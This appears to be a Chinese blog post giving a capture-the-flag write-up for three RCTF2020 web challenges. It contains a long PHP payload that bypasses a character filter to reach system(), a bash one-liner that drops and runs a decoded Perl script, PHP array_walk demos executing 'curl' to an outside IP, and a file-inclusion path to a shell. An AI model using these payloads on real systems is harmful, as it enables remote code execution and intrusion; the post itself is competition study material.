<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="RCTF2020-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/atom.xml" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/05/31/rctf2020-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="RCTF2020-wp">
<meta property="og:url" content="https://glotozz.github.io/2020/05/31/rctf2020-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/06/01/TjoDmxubqNt3kdJ.png">
<meta property="article:published_time" content="2020-05-30T16:22:09.000Z">
<meta property="article:modified_time" content="2020-06-02T16:07:40.669Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/06/01/TjoDmxubqNt3kdJ.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> RCTF2020-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="glotozz'blog" type="application/atom+xml">
</head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          RCTF2020-wp
        
      </h1>

      <time class="post-time">
          May 31 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#calc">calc</a></li>
<li><a href="#swoole">swoole</a></li>
<li><a href="#best_php">Best_PHP</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>这次比赛状态很差，躺的明明白白，可能是前两天培训太累了。。。</p>
<p>第一天手动档做完calc之后就一蹶不振，迷迷糊糊。这次题也不太想补，后面看情况吧</p>
<p>去实习前的最后几天只能勉强挖挖洞这样子了。</p>
<hr>
<h3><span id="calc">calc</span></h3><p>参考力哥之前roarctf的非预期解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020/5/30 14:50</span></span><br><span class="line"><span class="comment"># @Author  : glotozz</span></span><br><span class="line"><span class="comment"># @File    : 666.py</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">a = [<span class="string">'+'</span>, <span class="string">'.'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'E'</span>]</span><br><span class="line">b = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">a1 = a</span><br><span class="line">b1 = b</span><br><span class="line">c1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        tmp = chr(ord(i) &amp; ord(j))</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> a1:</span><br><span class="line">            a1.append(tmp)</span><br><span class="line">            b1.append(ord(tmp))</span><br><span class="line">            print(i + <span class="string">' &amp; '</span> + j + <span class="string">' =&gt; '</span> + str(tmp))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        tmp = chr(ord(i) | ord(j))</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> a1:</span><br><span class="line">            a1.append(tmp)</span><br><span class="line">            b1.append(ord(tmp))</span><br><span class="line">            print(i + <span class="string">' | '</span> + j + <span class="string">' =&gt; '</span> + str(tmp))</span><br><span class="line">print(a1)</span><br><span class="line">print(sorted(b1))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b1:</span><br><span class="line">    print(str(i) + <span class="string">' =&gt; '</span> + str(bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a2 = a1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a1:</span><br><span class="line">    tmp = chr(ord(i) &amp; ord(<span class="string">'@'</span>))</span><br><span class="line">    <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> a2:</span><br><span class="line">        print(i + <span class="string">' &amp; @'</span> + <span class="string">' =&gt; '</span> + str(tmp))</span><br><span class="line">        a2.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a1:</span><br><span class="line">    tmp = chr(ord(i) | ord(<span class="string">'@'</span>))</span><br><span class="line">    <span class="keyword">if</span> tmp <span class="keyword">not</span> <span class="keyword">in</span> a2:</span><br><span class="line">        print(i + <span class="string">' | @'</span> + <span class="string">' =&gt; '</span> + str(tmp))</span><br><span class="line">        a2.append(tmp)</span><br><span class="line">print(a2)</span><br></pre></td></tr></table></figure>

<p>然后就是手撸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">((99999999999999999999).(1))	&#x3D;&gt; 	1.0E+221</span><br><span class="line">取E</span><br><span class="line">(((99999999999999999999).(1))&#123;3&#125;)</span><br><span class="line">取0</span><br><span class="line">(((99999999999999999999).(1))&#123;2&#125;)</span><br><span class="line"></span><br><span class="line">初始字符</span><br><span class="line">[&#39;+&#39;, &#39;.&#39;, &#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;E&#39;]</span><br><span class="line"></span><br><span class="line">通过&amp;和|得到可用字符</span><br><span class="line">[0, 1, 4, 5, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 69, 101, 103, 109, 111, 117, 119, 125, 127]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要获得更多字符</span><br><span class="line"></span><br><span class="line">搞一个@出来，</span><br><span class="line">E-&gt;@</span><br><span class="line">0100 0101</span><br><span class="line">0100 0000</span><br><span class="line">需要第二位为1，第5、7位为0</span><br><span class="line">得到</span><br><span class="line">[64, 66, 72, 74, 80, 82, 88, 90, 96, 98, 104, 106, 112, 114, 120, 122, 192, 194, 200, 202, 208, 210, 216, 218, 224, 226, 232, 234, 240, 242, 248, 250]</span><br><span class="line"></span><br><span class="line">发现可用的字符无法直接对应，考虑取反操作</span><br><span class="line">5取反可以得到11111010，通过&amp;操作即可</span><br><span class="line">$a &#x3D; ((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;));</span><br><span class="line"></span><br><span class="line">得到如下</span><br><span class="line">[&#39;+&#39;, &#39;.&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;E&#39;, &#39;*&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;(&#39;, &#39;)&#39;, &#39;\x01&#39;, &#39;$&#39;, &#39;&amp;&#39;, &#39;\x04&#39;, &#39;\x00&#39;, &#39;\x05&#39;, &#39;&#x2F;&#39;, &#39;;&#39;, &#39;?&#39;, &#39;o&#39;, &#39;&gt;&#39;, &#39;u&#39;, &#39;:&#39;, &#39;\x7f&#39;, &#39;w&#39;, &#39;&lt;&#39;, &#39;&#x3D;&#39;, &#39;&#125;&#39;, &#39;e&#39;, &#39;g&#39;, &#39;m&#39;, &#39;%&#39;, &quot;&#39;&quot;, &#39;,&#39;, &#39;-&#39;, &#39;@&#39;, &#39;k&#39;, &#39;n&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;v&#39;, &#39;x&#39;, &#39;y&#39;, &#39;j&#39;, &#39;&#96;&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;h&#39;, &#39;i&#39;, &#39;A&#39;, &#39;d&#39;, &#39;f&#39;, &#39;D&#39;, &#39;&#123;&#39;, &#39;~&#39;, &#39;z&#39;, &#39;|&#39;, &#39;l&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">构造phpinfo()</span><br><span class="line">0 | @ &#x3D;&gt; p</span><br><span class="line">( | @ &#x3D;&gt; h</span><br><span class="line">0 | @ &#x3D;&gt; p</span><br><span class="line">) | @ &#x3D;&gt; i</span><br><span class="line">. | @ &#x3D;&gt; n</span><br><span class="line">&amp; | @ &#x3D;&gt; f</span><br><span class="line">+ | E &#x3D;&gt; o</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0(0).&amp;+</span><br><span class="line">@@@@@@E</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">+ &amp; 8 &#x3D;&gt; (</span><br><span class="line">+ &amp; 9 &#x3D;&gt; )</span><br><span class="line">. &amp; 6 &#x3D;&gt; &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">完整构造</span><br><span class="line">((((99999999999999999999).(1))&#123;2&#125;).((((99999999999999999999).(1))&#123;4&#125;)&amp;((8).(9))).(((99999999999999999999).(1))&#123;2&#125;).((((99999999999999999999).(1))&#123;4&#125;)&amp;((9).(9))).(((99999999999999999999).(1))&#123;1&#125;).((((99999999999999999999).(1))&#123;1&#125;)&amp;((6).(9))).(((99999999999999999999).(1))&#123;4&#125;))|(((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).((((999999999999999999999).(1))&#123;3&#125;)&amp;((~((5).(3))))&amp;(((999999999999999999999).(1))&#123;3&#125;)).(((99999999999999999999).(1))&#123;3&#125;))</span><br><span class="line"></span><br><span class="line">靶机不通外网，想办法搞个动态shell，因为没下划线，</span><br><span class="line">system(next(getallheaders()))</span><br><span class="line">手动挡</span><br><span class="line">(((3934).(((99999999999999999999).(1))%7B3%7D).(((99999999999999999999).(1))%7B3%7D))%7C(((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((99999999999999999999).(1))%7B4%7D)%26((0).(9))).(((((99999999999999999999).(1))%7B4%7D)%26((8).(9))))))((((((99999999999999999999).(1))%7B1%7D).((((99999999999999999999).(1))%7B3%7D)).(84))%7C(((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((99999999999999999999).(1))%7B4%7D)%26((0).(9))).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D))))((((((99999999999999999999).(1))%7B3%7D).(((99999999999999999999).(1))%7B3%7D).(4).((((99999999999999999999).(1))%7B4%7D)%26((1).(9))).(((((99999999999999999999).(1))%7B4%7D)%26((8).(9)))%7C((((99999999999999999999).(1))%7B1%7D)%26((4).(9)))).(((((99999999999999999999).(1))%7B4%7D)%26((8).(9)))%7C((((99999999999999999999).(1))%7B1%7D)%26((4).(9)))).((((99999999999999999999).(1))%7B4%7D)%26((8).(9))).(((99999999999999999999).(1))%7B3%7D).((((99999999999999999999).(1))%7B4%7D)%26((1).(9))).((((99999999999999999999).(1))%7B1%7D)%26((4).(9))).((((99999999999999999999).(1))%7B3%7D)).(23))%7C(((((99999999999999999999).(1))%7B4%7D)%26((2).(9))).((((99999999999999999999).(1))%7B4%7D)%26((0).(9))).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((99999999999999999999).(1))%7B4%7D)%26((0).(9))).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((99999999999999999999).(1))%7B4%7D)%26((0).(9))).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D)).((((999999999999999999999).(1))%7B3%7D)%26((~((5).(3))))%26(((999999999999999999999).(1))%7B3%7D))))()))</span><br></pre></td></tr></table></figure>

<p>最后利用管道解计算题读flag</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoIFwqQ0hMRF9JTiwgXCpDSExEX09VVCwgXCpDSExEX0VSUiwgJy9yZWFkZmxhZycgKQogIG9yIGRpZSAib3BlbjMoKSBmYWlsZWQgJCEiOwoKbXkgJHI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokciA9IGV2YWwgIiRyIjsKcHJpbnQgIiRyXG4iOwpwcmludCBDSExEX0lOICIkclxuIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokciA9IDxDSExEX09VVD47CnByaW50ICIkciI7Cg==|base64 -d|cat&gt;/tmp/gg.pl &amp;&amp; chmod 777 /tmp/gg.pl &amp;&amp; perl /tmp/gg.pl</span><br></pre></td></tr></table></figure>

<hr>
<h3><span id="swoole">swoole</span></h3><p>根据源码的意思<code>$a();</code></p>
<p>寻找<code>v4.4.18·</code>对应的php源码，全局搜索<code>invoke()</code>，只找到一个，以为只能调用一个无参函数或者继续<code>__invoke()</code></p>
<p>当时思路被<code>__invoke()</code>给限制的死死的。。</p>
<p>Demo1</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">work</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$b = <span class="keyword">array</span>($a,<span class="string">'work'</span>);</span><br><span class="line">$c = serialize($b);</span><br><span class="line">$a = unserialize($c);</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>

<p>通过<code>array</code>的形式调用对象的方法</p>
<p>先学习下Nu1L战队的非预期解法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL|E_STRICT);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'11'</span>;</span><br><span class="line">		$name = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">		$name(<span class="keyword">$this</span>, <span class="string">'array_walk'</span>, <span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;exec = <span class="keyword">array</span>(<span class="string">'curl 118.178.88.46:1234'</span>);</span><br><span class="line">$a-&gt;name = <span class="string">'array_walk'</span>;</span><br><span class="line">[$a, <span class="string">'exec'</span>]();</span><br></pre></td></tr></table></figure>

<p>传入的是个对象，<code>array_walk()</code>函数会依次调用每个属性</p>
<p><code>var_dump()</code>结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string(10) &quot;array_walk&quot;</span><br><span class="line">string(4) &quot;name&quot;</span><br><span class="line">int(3)</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0] &#x3D;&gt;</span><br><span class="line">  string(23) &quot;curl 118.178.88.46:1234&quot;</span><br><span class="line">&#125;</span><br><span class="line">string(4) &quot;exec&quot;</span><br><span class="line">int(3)</span><br></pre></td></tr></table></figure>

<p>Demo2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'exec'</span>=&gt;<span class="string">'curl 118.178.88.46:1234'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> B;</span><br><span class="line">$b-&gt;exec = <span class="keyword">array</span>(<span class="string">'curl 118.178.88.46:1234'</span>);</span><br><span class="line">array_walk($a,<span class="string">'array_walk'</span>,<span class="number">3</span>);<span class="comment">//执行失败</span></span><br><span class="line">array_walk($b,<span class="string">'array_walk'</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>需要设置一个对象的<code>exec</code>属性</p>
<p>预期解是利用mysql服务端恶意读取，有时间再看</p>
<hr>
<h3><span id="best_php">Best_PHP</span></h3><p><img src="https://i.loli.net/2020/06/01/TjoDmxubqNt3kdJ.png" alt="TIM图片20200531180419.png"></p>
<p>文件包含，通过写入<code>sqlite</code>数据库文件再包含从而getshell</p>
<p>跑字典发现下面的存在用户注册信息等，可控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;11</span><br></pre></td></tr></table></figure>

<p>忘记和队友说了。。。</p>
<p>后来看到队友是使用下面的路径包含成功的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先读取..&#x2F;.env</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;ctf-challenge&#x2F;database&#x2F;db.sqlite</span><br></pre></td></tr></table></figure>

<p>然后就是pwn一个so文件。。</p>
<hr>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/05/31/actf2020-wp/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">actf2020-wp</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/05/29/SRC%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E/">
        <span class="next-text nav-default">SRC常见漏洞学习-URL重定向漏洞</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
